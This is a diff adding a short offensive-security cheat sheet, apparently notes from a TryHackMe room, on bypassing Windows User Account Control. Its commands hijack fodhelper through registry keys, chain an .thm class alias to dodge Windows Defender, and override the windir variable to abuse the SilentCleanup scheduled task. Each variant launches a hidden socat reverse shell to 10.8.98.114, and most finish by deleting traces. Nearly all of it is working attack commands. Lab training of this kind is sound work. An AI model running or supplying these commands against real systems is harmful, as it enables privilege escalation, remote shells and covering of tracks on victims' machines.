@@ -1,0 +1,45 @@
+### User Account Control ###
+## links
+https://tryhackme.com/room/bypassinguac
+
+## automated
+https://github.com/hfiref0x/UACME
+> UACME-Akagi64.exe 33								# exe + id of the technic to use
+
+## check privileges
+> whoami /groups				
+...
+Mandatory Label\Medium Mandatory Level						# medium is "normal" user
+
+
+## with GUI
+> msconfig > Tools > Command Prompt
+> azman.msc > Help > Help Topics > right-client > View Source > File > Open > C:\Windows\System32 > rclick > open
+
+## with cmd
+> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.98.114:4444 EXEC:cmd.exe,pipes"
+> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+> reg add %REG_KEY% /d %CMD% /f
+> fodhelper.exe
+> reg delete HKCU\Software\Classes\ms-settings\ /f				# delete trace
+
+## with cmd with win def
+> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.98.114:4444 EXEC:cmd.exe,pipes"
+> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+
+## with cmd with win def without trigger it
+> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.98.114:4445 EXEC:cmd.exe,pipes"
+> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+> fodhelper.exe
+> reg delete "HKCU\Software\Classes\.thm\" /f					# delete trace
+> reg delete "HKCU\Software\Classes\ms-settings\" /f				# delete trace
+
+## with UAC always notify
+# override %windir% variable
+> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.8.98.114:4446 EXEC:cmd.exe,pipes &REM " /f
+> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+> reg delete "HKCU\Environment" /v "windir" /f					# delete trace
